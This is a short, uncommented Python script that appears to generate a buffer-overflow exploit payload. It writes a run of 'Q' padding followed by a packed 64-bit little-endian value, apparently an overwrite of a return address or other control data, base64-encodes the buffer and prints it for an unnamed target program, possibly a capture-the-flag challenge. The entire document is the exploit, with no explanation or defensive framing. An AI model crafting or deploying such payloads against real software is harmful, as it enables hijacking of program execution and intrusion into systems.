
import sys
import struct
import base64

buf = b'QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ'
buf += struct.pack('<Q', 16450645637006965968)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
